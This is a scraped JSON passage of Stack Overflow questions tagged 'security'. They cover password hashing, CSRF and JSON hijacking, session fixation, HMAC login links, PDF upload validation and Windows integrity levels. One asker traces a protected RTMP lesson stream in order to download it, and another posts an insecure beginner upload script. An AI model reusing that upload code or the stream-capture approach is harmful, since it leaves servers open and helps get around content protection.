</p>\n\n<pre><code>function asociate(id)\n{\n\n\n    $.ajax({\n        url: postbackURL, \n        type: 'POST',\n        data: AddPageTokenToAjaxRequest( { id: id} ),\n        success: function (result)\n        {\n            refresh();\n        }\n    });\n}\n</code></pre>\n\n<p>The thing is that I do not want to change the code in about 100 of these calls.\nIs there a way to override the data sending ajax call so that I do not have to make 100 changes ?</p>\n"},{"tags":["android","security","rooted-device"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":40,"score":0,"question_id":12793914,"title":"Android : What is the advantage of blocking an application getting installed in a rooted phone?","body":"<p>Is blocking an application from getting installed in a rooted phone, ensures data security?</p>\n\n<p>or</p>\n\n<p>Making an application getting installed in a rooted phone will put the data used by an application, vulnerable to foreign access.</p>\n\n<p>I'm not an Android expert. But I read in articles, unless the data used by an application is made available, other applications can not use it.</p>\n\n<p>I would like to have some clarification in it.</p>\n\n<p>Is it worth blocking an app on a rooted device for a concrete cause??</p>\n"},{"tags":["android","security","mobile"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12794122,"title":"How can I block an Android application to access location information through an Android application?","body":"<p>For example I want the user to be able to grant and deny access based on time/date/. To be able to specify the period e.g. 2 hours.</p>\n\n<p>Other restriction that the user can use is: e.g. If I'm on 3G, this X\napplication should not be able to access my location.</p>\n\n<p>If I'm on a Wi-Fi called work. This why application is able to access my location.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["php","security","shared-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12786774,"title":"Password Security for Shared Hosts (PHP 5.2+)","body":"<p>I'm working on some PHP meant to be deployed to users' servers - likely cheap/shared hosting (meaning lowest-common-denominator <strong>PHP 5.2, no modification of PHP installation</strong>). <a href=\"http://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords\">Common advice</a> for password hashes seems to be bcrypt or scrypt, via installable extensions for PHP 5.2.</p>\n\n<p>I've been thinking about using an iterated SHA-512 with a beefy per-user salt, but it doesn't sound like it really compares to bcrypt/scrypt.</p>\n\n<p><strong>Without the ability to modify the base PHP installation</strong>, what options do I have for strong password security?</p>\n"},{"tags":["oracle","security","plsql"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":192,"score":2,"question_id":7598446,"title":"Can only one procedure within a PL/SQL package be run with AUTHID CURRENT_USER?","body":"<p>I have a PL/SQL package that does <em>not</em> specify an <code>AUTHID</code> (effectively making it <code>AUTHID DEFINER</code>). However, there is precisely one procedure within this package that needs to run as <code>AUTHID CURRENT_USER</code>. Is this possible, or must I create a separate, top-level procedure?</p>\n"},{"tags":["c#","security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":306,"score":1,"question_id":2447735,"title":"Can someone explain C# CngKey.Create please?","body":"<p>The internet resources seem few and far between and the best MSDN page (as far as I could tell) throws an error!</p>\n\n<p>Specifically, I'm not sure what to create as a CngKeyCreationParameters object...</p>\n"},{"tags":["security","iis","email","smtp"],"answer_count":3,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":19369,"score":6,"question_id":239262,"title":"Can I configure SMTP in IIS, so it relays to a remote SMTP server?","body":"<p>I want to configure SMTP on my web server, so that any email sent through the SMTP server is relayed to a remote SMTP Server. The IIS SMTP server would have to use SMTP authentication, and use the host name, username and password (as if configuring a normal email client).</p>\n\n<p>Does anybody know if this is possible?</p>\n"},{"tags":["security","liferay-6","jsessionid"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":162,"score":0,"question_id":12775722,"title":"Creating a new JSESSIONID after authentication","body":"<p>When a user hits login page of a <code>Portal</code> (it could be <code>Liferay</code>, <code>Jboss Portal</code>..),  <code>JSESSIONID  cookie</code>is created by the <code>container</code>. After entering credentials in the login page, same <code>JSESSIONID</code> gets carried over. </p>\n\n<p>Here, end user will come to know the <code>JSESSIONID</code>before he could get authenticated (by checking the <code>JSESSIONID</code> in the login page). This will increase vulnerability of the site for hacking because one can know the <code>JSESSIONID</code>  before one gets authenticated. </p>\n\n<p>This <a href=\"http://stackoverflow.com/questions/4722151/what-is-the-vulnerability-of-having-jsessionid-on-first-request-only\">post</a> advices to have a different <code>JSESSIONID</code> after authentication. </p>\n\n<p>So, creating a new JSESSIOND can be achieved by <code>Portal</code> server being used (am using <code>Liferay CE 6.0</code>) or it has to be handled by web application developer? If it has to be handled by web application developer what is the best way to do?  <code>request.getSession(true)</code> is the only option?? If I need to instruct <code>Liferay</code> to create a new <code>JSESSIONID</code> after authentication how it can be done?</p>\n"},{"tags":["ruby-on-rails","security","web-security","hmac"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12789389,"title":"HMAC URLs instead of login?","body":"<p>In implementing my site (a Rails site if it makes any difference), one of my design priorities is to relieve the user of the need to create yet another username and password while still providing useful per-user functionality.</p>\n\n<p>The way I am planning to do this is:</p>\n\n<ol>\n<li>User enters information on the site. Information is associated with the user via server-side session.</li>\n<li>User completes entering information, server sends an access URL via e-mail to the user roughly in the form of: <code>http://siteurl/&lt;user identifier&gt;/&lt;signature: HMAC(secret + salt + user identifier)&gt;</code></li>\n<li>User clicks URL, site looks up user ID and salt and computes the HMAC with the server-stored secret and authenticates if the computed HMAC and signature match.</li>\n</ol>\n\n<p>My question is: is this a reasonably secure way to accomplish what I'm looking to do? Are there common attacks that would render it useless? Is there a compelling reason to abandon my desire to avoid a username/password? Is there a must-read book or article on the subject?</p>\n\n<p>Note that I'm not dealing with credit card numbers or anything exceedingly private, but I would still like to keep the information reasonably secure.</p>\n"},{"tags":["security","password-encryption"],"answer_count":8,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":743,"score":2,"question_id":1225528,"title":"Double hashing security","body":"<p>My first question is, I've heard that hashing the string 2 times (e.g. sha1(sha1(password)) ), because the second hash has a fixed length, is it true??</p>\n\n<p>My the second question is, which is safer? (var1 and var2 are 2 strings):</p>\n\n<ol>\n<li>sha1(var1 + sha1(var2))</li>\n<li>sha1(var1 + var2)</li>\n</ol>\n\n<p>If it is the 1st one, is it worth the performance cost?</p>\n"},{"tags":["php","security","patch","php-5.2"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":402,"score":2,"question_id":6642369,"title":"Does PHP 5.2 still receive security patches?","body":"<p>My server admin tells me PHP 5.2 has been EOLed and so receives no bug fixes. This is obviously the case. He also tells me that 5.2 receives no security patches, which suggests we should upgrade to 5.3 ASAP.</p>\n\n<p>However, a programmer I respect tells me that while PHP 5.2 has been EOLed for bug fixes, it is still very much supported insofar as security exploits are concerned - at least till 2012.</p>\n\n<p>I've searched stackoverflow and google high and low but have come up with no answers to this elementary question.</p>\n\n<p>Anyone care to inform my ignorance?</p>\n"},{"tags":["asp.net","security","reportviewer","report"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4382,"score":0,"question_id":3679284,"title":"Report Viewer error: The request failed with HTTP status 401: Unauthorized","body":"<p>I have a asp.net c# web application with contains reports in remote processing mode.  I am using the report-viewer control to render the reports.  When I run the application in debug mode, I'm able to view my reports however when I publish the application to a different server I get this error message:</p>\n\n<p>The request failed with HTTP status 401: Unauthorized. </p>\n\n<p>My report server is on a different server than the location of my published web application.  I have added new role assignment to my report server and also added     to my web.config but the error persists.  I think I am missing something in my aspx page for reportviewer.</p>\n\n<p>Any input would be appreciated.</p>\n"},{"tags":["c#","asp.net",".net","security","owasp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":60,"score":-6,"question_id":12786845,"title":"Solution for Owasp Hacme bank Lessons","body":"<p>I am looking for the solutions to security defects in hacme bank. hacme bank is a asp.net web application which contains some owasp security defects. I want to know how can i improve the aaplication to remove these defects. Are there answers available for hacme back lessons.</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":62,"score":-2,"question_id":12786215,"title":"Set Apk password to preserving privacy","body":"<p>I create an app , i wonder if i can set an password to my Apk just in decompiling ,so  when anyone  try to decompile the application , it will ask for the password , so that will prevent my apk from hacking and preserving my privacy .</p>\n\n<p>any advice will be appreciated , thanks alot .</p>\n"},{"tags":["python","security","encryption","oauth"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":268,"score":3,"question_id":7629288,"title":"Securely store Oauth token(s) in file","body":"<p>I'm developing a small webapp in python that'll interact with a users dropbox account. What is the best way to store the Oauth tokens for that account in a flat file? </p>\n\n<p>Is hashing the tokens secure enough? Or should I encrypt them? If encrypting them is the way to go, how would you suggest storing the key, since 2 way encryption would be necessary to decrypt the tokens for sending to Dropbox?</p>\n\n<p><strike>I could load up sqlite and store the tokens in there, but I'm wondering if there's a good way to do it using flat files.</strike> Same issue is run into with Sqlite, since its also a file. Of course, the file permissions would only be set to the least permissible privilege to be accessed by the webapp.</p>\n"},{"tags":["javascript","asp.net","web-services","security","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12727187,"title":"Security issue with  WebService [Get] Requests?","body":"<p><em>After reading the famous (and only) <a href=\"http://weblogs.asp.net/scottgu/archive/2007/04/04/json-hijacking-and-how-asp-net-ajax-1-0-mitigates-these-attacks.aspx\" rel=\"nofollow\">article</a> about trying to explain why <code>asmxs</code> should NOTallow Get requests\nso we shouldn't use : <code>[ScriptMethod(UseHttpGet = true)]</code> , I still I have a question :</em></p>\n\n<p>Why ?</p>\n\n<p>Web service  , as its name is a service  , he doesn't suppose to care if it's GET or POST : </p>\n\n<p>Even if a person do a CSRF : like  embedding in his malicious site : </p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"http://contoso.com/StockService/Stock.asmx/GetQuotes?symbol=msft\" /&gt; \n</code></pre>\n\n<p>so what ?</p>\n\n<p>Via asmx POV - it is just a normal request.</p>\n\n<p>Can someone please spot for me the problem with example ?</p>\n\n<h2>edit</h2>\n\n<p>there are many problems solved with new browsers.\nthis <a href=\"http://www.thespanner.co.uk/2011/05/30/json-hijacking/\" rel=\"nofollow\">link</a> shows some other methods which should be tested in new browsers.</p>\n"},{"tags":["android","security","checksum"],"answer_count":2,"favorite_count":4,"up_vote_count":3,"down_vote_count":0,"view_count":71,"score":3,"question_id":12785001,"title":"Verify Android apk has not been repackaged?","body":"<p>Looking to improved the security of my Android app to flag if the .apk has been extracted, modified, repacked and resigned. Here's article from Zdnet noting the issue <a href=\"http://www.zdnet.com/android-malwares-dirty-secret-repackaging-of-legit-apps-7000000886/\" rel=\"nofollow\">link1</a>. </p>\n\n<p>The concern is if the app is targeted by hackers they could add malicious code and upload to an alternate app store and dupe users in to downloading it. </p>\n\n<p>So I'm thinking code to verify a checksum of the apk or signing certificate?</p>\n\n<p>I appreciate the app code could be repacked and any security code removed, but it does increase the difficulty of repacking it, maybe enough for them to try another app.</p>\n\n<p>[update]I know the Google Play store licensing module offers something similar but I'm looking for something for non paid apps and other/non marketplaces. </p>\n"},{"tags":["asp.net","security","hmac"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12784775,"title":"I Still don't get HMAC or how Signing a request works","body":"<p>I work on ASP.NET and was just reading this from the amazon directory <a href=\"http://docs.amazonwebservices.com/AmazonS3/latest/dev/RESTAuthentication.html\" rel=\"nofollow\">http://docs.amazonwebservices.com/AmazonS3/latest/dev/RESTAuthentication.html</a> where it states</p>\n\n<blockquote>\n  <p>Informally, we call this process \"signing the request,\" and we call\n  the output of the HMAC algorithm the \"signature\" because it simulates\n  the security properties of a real signature. Finally, you add this\n  signature as a parameter of the request, using the syntax described in\n  this section.</p>\n  \n  <p>When the system receives an authenticated request, it fetches the AWS\n  Secret Access Key that you claim to have, and uses it in the same way\n  to compute a \"signature\" for the message it received. It then compares\n  the signature it calculated against the signature presented by the\n  requester.</p>\n</blockquote>\n\n<p>But i presume both the requests wont be same right. Request is signed (great!!) but HMAC of the response from the client browser is going to be different since it contains extra data Right? so how come requests can validate even though they are valid</p>\n"},{"tags":["c#",".net","security","project","token"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":65,"score":-2,"question_id":12784330,"title":"Any free library to generate tokens","body":"<p>Tokens can be used for many purposes in a web application some of them below</p>\n\n<ol>\n<li>Generate short verification code for signup's</li>\n<li>Verification code for mobile authentication    </li>\n<li>Avoid CSRF through use of request mapped token    </li>\n<li>Email link validation and many many more</li>\n</ol>\n\n<p>I am on the lookout for one that will do this for me. A token is a short alphanumeric string that is unique, random and configurable. Does anyone know one for .NET, C#</p>\n"},{"tags":["security","encryption","embedded"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12783308,"title":"Why do so many embedded devices use shared keys?","body":"<p>I know this is not strictly a programming question, but I believe it is constructive and relevant to embedded development.</p>\n\n<p>Many commercially available embedded device manufactures use the same keys for all instances of their respective devices. This situation is so rampant, a project called <a href=\"https://code.google.com/p/littleblackbox/\" rel=\"nofollow\">littleblackbox</a> has created a catalog of these keys. From their site:</p>\n\n<blockquote>\n  <p>A command line utility is included to aid in the identification of\n  devices or network traffic that use these known private keys. Given a\n  public certificate, the utility will search the database to see if it\n  has a corresponding private key; if so, the private key is displayed\n  and can be used for traffic decryption or MITM attacks.</p>\n</blockquote>\n\n<p>Having a connection that has been \"secured\" by a publicly known private key provides the user with a false sense of security (especially if CA signed certificates are used), potentially making the device manufacturer liable (in my non-attorney opinion). So why do they do it? Is there some odd benefit I'm missing? The obvious solution to me would be to generate a self-signed certificate on the device's first boot.   </p>\n"},{"tags":["php","javascript","html","ajax","security"],"answer_count":1,"favorite_count":5,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":12783695,"title":"Copy Security for HTML site","body":"<p>I just finished my first Site Template on ThemeForest. <br />\nNow i searched for some tips to shared it to get the most purchased. Then i found some programmes which allow you to copy a full site from a web, e.g <a href=\"http://www.httrack.com/\" rel=\"nofollow\">HTTrack</a> <br />\n<br />\nNow my question is: how can i <strong>prevent a copy request</strong> by a program like HTTrack? <br />\nMaybe i can manipulate something in my Demo-Files to confuse the program... <br />\n<br />\nI found nothing in the web... </p>\n"},{"tags":["security","authentication","erlang","couchdb","sasl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12781942,"title":"Erlang SASL AUTH PROTOCOL implementation","body":"<p>Many Systems are beginning to use this <a href=\"http://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer\" rel=\"nofollow\">SASLAuthProtocol</a> (see <a href=\"http://tools.ietf.org/html/rfc4422\" rel=\"nofollow\">RFC4422</a>) for authenticating Clients in RESTFUL interactions. Examples are: Couchbase Server 2.0, Memcached e.t.c. I wonder if there is an erlang complete implementation of this authentication protocol. A <a href=\"http://docs.oracle.com/javase/6/docs/technotes/guides/security/sasl/sasl-refguide.html\" rel=\"nofollow\">Java implementation</a> is a good example of what i am looking for. This <a href=\"https://github.com/membase/ep-engine/blob/master/management/mc_bin_client.py\" rel=\"nofollow\">Python Code</a> seems to be the python implementation of this protocol. Is there an Erlang library i can quickly use to have SASLAuth support in my Application ? </p>\n"},{"tags":["php","security","pdf","upload","file-rename"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12782980,"title":"PDF Uploader script","body":"<p>I have spent 3 days reading and doing tutorials about PHP upload scripts for uploading PDF files to a website, renaming and moving the files.  I can't seem to find a consistent answer on how to format the script. From my reading I see the following as important to this process.  I have not found a good working answer to the PDF upload issue.  </p>\n\n<ol>\n<li>It is important to validate the PDF files with a server side mime verification.  </li>\n<li>Clamscan is important to keep the site clean. Should this be done immediately after upload?</li>\n<li>Files should not be accessible until they are verified by type and virus free.  My understanding is that this is best done by the \"rename\" function of PHP that will allow a move and rename.  </li>\n<li><p>I had considered uploading PDFs into my MySql database, but after reading much of the online advice, I now feel that this may not be the best for my site.  </p></li>\n<li><p>I will be having clients upload pdfs via a html form.  </p></li>\n</ol>\n\n<p>Here is the form I was using:</p>\n\n<pre><code>    &lt;form action =\"PHP UPLOAD.php\" method=\"post\" encrypte=\"multipart/form-data\"&gt;\n    File: &lt;input type=\"file\" name=\"file\" size=\"30\"&gt; &lt;input type=\"submit\" value=\"upload!\"&gt;\n    &lt;/form&gt;\n</code></pre>\n\n<p>This is the PHP I started with from an online tutorial.</p>\n\n<pre><code>&lt;?php\n\n$uploaddir = \"cover\";\n$allowed_ext = \"pdf\";\n$max_size = \"5000000\";\n//$max_height = \"\";\n//$max_width = \"\";\n\n$extension = pathinfo($_FILES['file'] ['name']);\n$extension = $extension[extension];\n$allowed_paths = explode(\", \", $allowed_ext);\nfor($i = 0; $i &lt; count($allowed_paths); $i++) {\nif ($allowed_paths [$i] == \"$extension\") {\n    $ok = \"1\";\n}\n}\n\n\nif ($ok == \"1\")  {\n    if($_FILES['file']['size'] &gt; $max_size)\n    {\n        print \"File is too big!\";\n        exit;\n    }\n\n// Include for images\n//if ($max_width &amp;&amp; $max_height) {\n//list ($width, $height, $type, $w) =\n//getimagesize($_FILES['file']['tmp_name']);\n//if ($width . $max_width || $height &gt; $max_height)\n//{\n//print \"File height and/or width are too big!\";\n//exit;\n//}\n//}\n\nif(is_uploaded_file($_FILES['file']['tmp_name']))\n{\nmove_uploaded_file($_FILES['file']['tmp_name'],$uploaddir.'/'.$_FILES['file']['name']);\n}\nprint \"Your Cover Letter has been successfully uploaded!\";\n} else {\nprint \"Incorrect file extension!\";\n}\n\n?&gt;\n</code></pre>\n\n<p>It returned an Invalid File Type message to me.  </p>\n\n<p>I found this code and it seems to be a better verification via Mime Type, but appears to be not complete.</p>\n\n<pre><code>$allowedExts = array(\n  \"pdf\", \n  \"doc\", \n  \"docx\"\n); \n\n$allowedMimeTypes = array( \n  'application/msword',\n  'text/pdf',\n  'image/gif',\n  'image/jpeg',\n  'image/png'\n);\n\n$extension = end(explode(\".\", $_FILES[\"file\"][\"name\"]));\n\nif ( 20000 &lt; $_FILES[\"file\"][\"size\"]  ) {\n  die( 'Please provide a smaller file [E/1].' );\n}\n\nif ( ! ( in_array($extension, $allowedExts ) ) ) {\n  die( 'Please provide another file type [E/2]. );\n}\n\nif ( in_array( $_FILES[\"file\"][\"type\"], $allowedMimeTypes ) ) \n{      \n move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); \n}\nelse\n{\ndie( 'Please provide another file type [E/3]. );\n}\n</code></pre>\n\n<p>I am trying to learn, but I don't seem to be able to find a very clear path that solves my issues. Can someone give me some clear answers as to what is special about PDF uploads and this process?</p>\n\n<p>For Background, I am building this on my MAC using MAMP and Dreamweaver &amp; Text Wrangler.  I will be implementing this to a GoDAddy site. So, if you know issues that I will be facing I would appreciate a heads up. </p>\n\n<p>Thanks in Advance!</p>\n"},{"tags":["security","multiple","cheat","anti-cheat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":37,"score":-2,"question_id":12781827,"title":"How to identify visitors are unique?","body":"<p>i trying make an internet voting service but the problem is internet is just so easy to cheat by creating multiple accounts and vote same thing. capcha and email is not helping as take just 3 second to pass by human. IP can be changed by proxy. if we put some cookie on voter browser he just clean it next time.</p>\n\n<p>i created this question to ask help for methods we can use with basic futures that all browsers have (javascript etc)to prevent our service being cheated easily.</p>\n\n<p>the first idea i have myself is that possible my website access all cookies user have on his browser by just visiting my site ? because when they clean everything by CCleaner for new accounts then i can understand the browser is empty so the person is perhaps a cheater as most of real users when come to my site always have at least several cookie from different sites</p>\n"},{"tags":["facebook","security","facebook-graph-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12781678,"title":"How to know with which facebook account a client app is connected, without sharing the access token","body":"<p>I don't know whether what I want is possible at all; it does seem like a I have a plausible use case though.</p>\n\n<p>I have an (untrusted) client side app A, which did a <a href=\"https://developers.facebook.com/docs/authentication/client-side/\" rel=\"nofollow\">facebook connect through javascript</a>, say to Sam's account. This app talks to another (untrusted) client side app B (app B runs on another user's computer and is facebook connected to another facebook account, Paul's). App A needs to tell app B that it acts on behalf of Sam, how can it do this in a secure way?</p>\n\n<ul>\n<li>Obviously if A just sends \"Hi, I'm Sam\", app B doesn't know whether app A is lying or not</li>\n<li>App A might send its facebook access token, and app B can call <a href=\"https://graph.facebook.com/me\" rel=\"nofollow\">https://graph.facebook.com/me</a> with that token, and know for sure that A isn't lying. However, now B has A's access token, and can make all sort of facebook calls on Sam's behalf. Definitely not what we want</li>\n<li>I would like to avoid having to build some trusted server, where for instance A sends its access token, and B then gets a trusted reply of who A is</li>\n<li>I guess in theory B could ask A to post something to facebook, and then check for this content, but this has all sorts of side effects that don't seem desirable</li>\n</ul>\n\n<p>I'm just wondering whether there is anything out there that could solve this. In theory, B could send A a challenge, A uses its token to sign it, send it back, and B checks the signature with facebook (if this were possible); or B sends a challenge, A uses its access token to have facebook sign the challenge (again, if possible), send the result back to B. Or perhaps there is another obvious solution that I don't see.</p>\n"},{"tags":["security","cakephp","cakephp-2.0","uploadify","swfupload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12689470,"title":"Cakephp 2.2 and SWFUploader black-holed","body":"<p>I am having a typical file upload method (inside a plugin) in my app and I am using for this Uploadify that uses SFWUpload.\nI used this for an application that is written in CakePHP 1.3 (and it worked OK). Now I am updating the app to CakePHP 2.2.2. The problem is that when I am trying to upload the file I am getting a Security black-holed error (400 error).</p>\n\n<ul>\n<li>I have disabled the Security for the uploader action inside the beforeFilter() callback but no success.</li>\n</ul>\n\n<blockquote>\n<pre><code>if($this-&gt;request-&gt;action == 'add_profile_picture'){\n\n   $this-&gt;Security-&gt;enabled = false;\n\n}\n</code></pre>\n</blockquote>\n\n<ul>\n<li>I have also disabled the Auth for that function so I don't have any problems on upload regarding the passing of Session and Flash...</li>\n</ul>\n\n<blockquote>\n<pre><code>...\n    $this-&gt;Auth-&gt;allow('add_profile_picture');\n...\n</code></pre>\n</blockquote>\n\n<p>If anyone had similar problems and solve it please give me a hint or two.</p>\n\n<p>Thanks</p>\n"},{"tags":["c++","security","winapi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12774738,"title":"How to determine the integrity level of a process？","body":"<p>all\nI recently need to get the integrity level of a process, and I found help from MSDN. The sample code looks like this:</p>\n\n<pre><code>if (GetTokenInformation(hToken, TokenIntegrityLevel, \n     pTIL, dwLengthNeeded, &amp;dwLengthNeeded))\n {\n  dwIntegrityLevel = *GetSidSubAuthority(pTIL-&gt;Label.Sid, \n    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid)-1));\n\n  if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)\n  {\n   // Low Integrity\n   wprintf(L\"Low Process\");\n  }\n  else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp; \n       dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID)\n  {\n   // Medium Integrity\n   wprintf(L\"Medium Process\");\n  }\n  else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID)\n  {\n   // High Integrity\n   wprintf(L\"High Integrity Process\");\n  }\n  else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_SYSTEM_RID)\n  {\n   // System Integrity\n   wprintf(L\"System Integrity Process\");\n  }\n }\n</code></pre>\n\n<p>As you all know, </p>\n\n<pre><code>SECURITY_MANDATORY_LOW_RID == 0x00001000L\nSECURITY_MANDATORY_MEDIUM_RID == 0x00002000L\nSECURITY_MANDATORY_HIGH_RID == 0x00003000L\nSECURITY_MANDATORY_SYSTEM_RID == 0x00004000L.\n</code></pre>\n\n<p><strong>Here is my question:</strong>\nIf this sample code is correct, then what integrity level does process A have if it has the dwIntegrityLevel of 0x00004100L? SECURITY_MANDATORY_HIGH_RID and SECURITY_MANDATORY_SYSTEM_RID? Does it mean that a process have SECURITY_MANDATORY_SYSTEM_RID level also have a SECURITY_MANDATORY_HIGH_RID?</p>\n\n<p>If the sample code is wrong, then what is the right way to determine the integrity level of a process?</p>\n"},{"tags":["osx","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12778170,"title":"Is it possible to change User's Home Directorys permission in OSX?","body":"<p>Most of your staff uses OSX as main operation system. The problem is that recently we were attacked with some odd malware: users are getting zip-file via mail, and when they open this zip file, they execute a binary keylogger malware, that is inside this zipped file.</p>\n\n<p>We have some non-technical limitations and due this limitation we can't configure user's mail servers. But actually we have physical access to their laptops.</p>\n\n<p>As far as I know, there is possible to mount user's home directory without \"x\" (execution) permission in Linux and *BSD. So users can't run some binary file inside home directory.</p>\n\n<p>Is it possible to configure OS X so that user can't execute files inside /Users/?</p>\n"},{"tags":["sql","sql-server","security","design-patterns"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12776105,"title":"SQL Query Execution more than once?","body":"<p>I have 2 tables (A,B), and 1 query</p>\n\n<p>My query is something like this</p>\n\n<ol>\n<li>Read From A</li>\n<li>Update B with this data from A</li>\n<li>Using the updated table B, set final value of A.</li>\n</ol>\n\n<p>Example execution can be find in below question:\n<a href=\"http://stackoverflow.com/questions/12775845/proper-way-to-keep-a-single-data-in-sql-server\">Proper way to keep a single data in sql server?</a></p>\n\n<p>Now since all the process is connected, this query should not be executed twice at the same time, or by 2 different users until the process ends. How do I prevent this ? Or does it already work securely like this?</p>\n"},{"tags":["python","security","mobile"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":171,"score":0,"question_id":4081333,"title":"feature mobile phone tracking application","body":"<p>I would like to build a mobile phone tracking application for feature phones which have minimum of gprs connectivity. I would like a user to log in to the application and be able to see the location of their phone through google maps. Any resources or information will be highly appreciated. I would preferably use python.</p>\n"},{"tags":["security","symfony2","login","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12772773,"title":"CSRF protection in login form","body":"<p>I'm using Symfony 2.1 to build a website with a little login form. I'm following the tutorial at <a href=\"http://symfony.com/doc/current/book/security.html#book-security-form-login\" rel=\"nofollow\">this</a> link but I don't see any part talking about the CSRF protection. However, <a href=\"http://symfony.com/doc/current/reference/configuration/security.html\" rel=\"nofollow\">here</a> there are all the options for the login security and at the end I can clearly see that that type of protection should be supported. I don't understand how to use it</p>\n"},{"tags":["flash","security","rtmp","shockwave"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3062,"score":1,"question_id":4808322,"title":"How to save this rtmp flash video stream?","body":"<p>Please don't flag this post as not programming related. Only programmers can answer this. </p>\n\n<p>My sister wanted me to save <a href=\"http://esewingworkshop.com/video-lesson/overview-zipper-types\" rel=\"nofollow\">http://esewingworkshop.com/video-lesson/overview-zipper-types</a> flash video &amp; couple more for offline viewing purposes and asked me how to save it.</p>\n\n<p>I immediately fired firebug in firefox but surprisingly the video source is not in the requests. <a href=\"http://hwcdn.net/m7n9i8d5/fms/videos/5_Standard_Zipper/B_Overview_of_Zipper_Types.flv.smil\" rel=\"nofollow\">http://hwcdn.net/m7n9i8d5/fms/videos/5_Standard_Zipper/B_Overview_of_Zipper_Types.flv.smil</a> is the last request that is being made. response being:</p>\n\n<pre><code>&lt;smil&gt;\n&lt;head&gt;\n&lt;meta base=\"rtmp://fms006.lo1.hwcdn.net/m7n9i8d5/_definst_\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;video src=\"fms/videos/5_Standard_Zipper/B_Overview_of_Zipper_Types?doppl=965d6485db1d06d2&amp;dopsig=867922856d781b57521a1dd3f7c28c5b\"&gt;&lt;/video&gt;\n&lt;/body&gt;\n&lt;/smil&gt;\n</code></pre>\n\n<p>So, I its using <code>rtmp</code> streaming protocol. I tried to figure out the source of this stream. I used \"wireshark\" and analysed the traffic and followed the TCP stream:</p>\n\n<pre><code>POST http://fms006.lo1.hwcdn.net/fcs/ident2 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: fms035.lo1.hwcdn.net\nContent-Length: 1\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n HTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 14\nServer: FlashCom/3.5.5\nContent-Type: text/plain\n\n209.197.11.150POST http://209.197.11.219/open/1 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: 209.197.11.219\nContent-Length: 1\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n HTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 17\nServer: FlashCom/3.5.5\nContent-Type: application/x-fcs\n\nWubmcmj7Q1T-6Tic\nPOST http://209.197.11.219/idle/Wubmcmj7Q1T-6Tic/0 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: 209.197.11.219\nContent-Length: 1\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n HTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 1\nServer: FlashCom/3.5.5\nContent-Type: application/x-fcs\n\nPOST 